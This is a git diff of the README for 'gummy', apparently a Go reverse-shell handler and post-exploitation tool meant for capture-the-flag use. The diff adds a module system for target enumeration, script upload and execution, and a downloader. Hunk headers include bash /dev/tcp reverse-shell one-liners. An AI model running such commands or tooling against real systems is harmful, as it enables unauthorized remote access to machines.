@@ -133,14 +133,35 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Platform detection (Linux/Windows/macOS)
   - Background monitoring for session health
   - Graceful handling of dead sessions
+- [x] **Module System** (`internal/modules.go`) 🆕
+  - Module interface and registry (singleton pattern)
+  - Built-in `enum` module - Basic system enumeration
+  - Built-in `lse` module - Linux Smart Enumeration
+  - Commands: `modules` (list), `run <module> [args]` (execute)
+  - Category-based organization
+  - Automatic script download, upload, and execution
+- [x] **Session Directories** 🆕
+  - Format: `~/.gummy/YYYY_MM_DD/ID_IP_user_hostname/`
+  - Auto-created `scripts/` and `logs/` subdirectories
+  - Path sanitization for special characters
+  - Timestamps for all module outputs
+- [x] **HTTP Downloader** (`internal/downloader.go`) 🆕
+  - Download files from URLs with progress indication
+  - Animated spinners with percentage and size
+  - Human-readable file sizes (KB, MB, GB)
+- [x] **Terminal Opener** (`internal/terminal.go`) 🆕
+  - Opens new terminal window for module outputs
+  - Prioritizes modern terminals (kitty, ghostty, foot)
+  - Falls back to traditional terminals
+  - Auto-detects available terminal emulator
 
 ### 📋 TODO (Phase 4 - Additional Features)
 - [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
-- [ ] Port forwarding (local/remote)
+- [ ] **PEAS Module** - LinPEAS/WinPEAS with streaming output
+- [ ] **Session Logging** - Automatic logging of all session I/O to `logs/` directory
+- [ ] Port forwarding (local/remote) - NOT PRIORITY (use ligolo)
 - [ ] Auto-reconnect capability
-- [ ] Session logging to files
 - [ ] WinRM support (Windows automation)
-- [ ] Module system for post-exploitation
 
 ## Project Structure
 
@@ -149,13 +170,16 @@ gummy/
 ├── main.go                      # ✅ Entry point, CLI flags, interface resolution
 ├── internal/
 │   ├── listener.go              # ✅ TCP listener, connection acceptance (160 LOC)
-│   ├── session.go               # ✅ Multi-session manager, interactive menu (1167 LOC)
+│   ├── session.go               # ✅ Multi-session manager, interactive menu (1230 LOC)
 │   ├── shell.go                 # ✅ Shell I/O handler + bidirectional communication (413 LOC)
 │   ├── pty.go                   # ✅ PTY upgrade system (233 LOC)
 │   ├── transfer.go              # ✅ File upload/download with progress (454 LOC)
 │   ├── ssh.go                   # ✅ SSH connection + auto reverse shell (106 LOC)
 │   ├── payloads.go              # ✅ Reverse shell payload generators (91 LOC)
 │   ├── netutil.go               # ✅ Network interface utilities (107 LOC)
+│   ├── modules.go               # ✅ Module system + enum/lse modules (236 LOC) 🆕
+│   ├── downloader.go            # ✅ HTTP downloader with progress (65 LOC) 🆕
+│   ├── terminal.go              # ✅ Terminal opener (modern terminals) (77 LOC) 🆕
 │   └── ui/
 │       ├── colors.go            # ✅ Color/formatting with Lipgloss + Bubble Tea (417 LOC)
 │       └── spinner.go           # ✅ Animated spinners for long operations (73 LOC)
@@ -719,11 +743,11 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 
 ## Progress Tracking
 
-**Last updated:** 2025-10-15
-**Current focus:** Phase 3 complete + Project structure refactored!
-**Next milestone:** Port forwarding (Phase 4) or Module system
-**Lines of code:** ~3,370 LOC (2,725 core + 490 UI + 155 main)
-**Modules:** 10 files in `internal/` (flat structure) + 1 `main.go`
+**Last updated:** 2025-10-16
+**Current focus:** Module System complete! 🎉
+**Next milestone:** PEAS module with streaming output or Session logging
+**Lines of code:** ~3,748 LOC (3,103 core + 490 UI + 155 main)
+**Modules:** 13 files in `internal/` (flat structure) + 1 `main.go`
 **Status:** Production-ready for CTF use! ✅
 
 ### Feature Completeness
@@ -732,7 +756,7 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 - ✅ **UI/UX** - Lipgloss styling, Bubble Tea confirmations, animated spinners
 - ✅ **Automation** - SSH integration, payload generation, shell spawning
 - ✅ **Reliability** - Session monitoring, buffer draining, graceful error handling
-- ⏳ **Advanced features** - Port forwarding, logging, module system (TODO)
+- ✅ **Module System** - Extensible module system with enum and LSE modules
 
 ### Command Reference
 ```
@@ -750,6 +774,10 @@ kill <id>                    - Kill specific session
 # File operations
 upload <local> [remote]      - Upload file (ESC to cancel)
 download <remote> [local]    - Download file (ESC to cancel)
+
+# Modules
+modules                      - List available modules
+run <module> [args]          - Run module (e.g., run enum, run lse -l2)
 
 # Utility
 help                         - Show command reference
